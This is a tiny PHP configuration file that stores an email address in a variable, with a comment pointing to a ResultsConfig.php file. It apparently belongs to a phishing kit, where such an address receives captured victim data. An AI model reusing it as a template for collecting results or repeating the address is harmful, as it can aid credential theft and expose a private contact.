<?php
// Please Read ResultsConfig.php Before doing anything

$Email = 'yba.boss@aol.com';
?>